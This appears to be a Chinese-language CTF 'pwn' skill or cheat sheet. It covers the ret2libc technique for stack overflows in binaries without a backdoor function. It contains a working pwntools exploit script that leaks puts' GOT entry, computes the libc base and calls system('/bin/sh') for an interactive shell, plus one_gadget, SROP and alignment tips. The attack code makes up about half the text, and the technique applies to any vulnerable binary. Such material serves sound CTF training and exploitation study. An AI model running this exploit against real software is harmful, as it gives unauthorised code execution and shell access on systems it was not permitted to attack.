---
name: pwn/ret2libc-leak
description: 无 system 符号时：泄露 libc、算基址、ret2libc / one_gadget
when_to_use: 栈溢出但没有后门函数，二进制自带 puts/read/write 可泄露 GOT
categories: [pwn]
keywords: [ret2libc, libc, leak, got, one_gadget, 栈溢出]
---
## 三步走

1. `checksec` 确认 NX 开、PIE 状态、有没有 canary。
2. 用 `pop rdi; ret` 把 GOT 里某个已解析函数（puts/read/write）当地址传给 `puts`，
   同时把返回地址设回 `main`/`vuln`，一次 payload 泄 + 二次 payload 打。
3. `libc.address = leaked - libc.symbols['puts']`，然后 `ret2libc`。

```python
from pwn import *
elf = ELF('./chal'); libc = ELF('./libc.so.6' if args.LIBC is None else args.LIBC)
p = process('./chal')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
p.send(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

payload2  = b'A' * offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.symbols['system'])
p.send(payload2); p.interactive()
```

## 没有 /bin/sh 或 system 不可用

- `one_gadget libc.so.6` 找约束最小的 gadget（`execve("/bin/sh", rsp+.., environ)`），
  约束不满足时在前面垫若干 `ret` 调整栈。
- 或者 `setcontext+offset` 做 SROP，配合 `syscall; ret`。

## 常见坑

- 栈 16 字节对齐：`system` 里 `movaps` 崩溃时在 `pop rdi` 前多垫一个 `ret`。
- 远程 libc 版本不对 → 用题目给的 `libc.so.6`，或用 leak 低 12 位去 libc-database 查。
- 泄露函数被 `full RELRO` 保护时 GOT 只读，改打栈或 `__free_hook`。
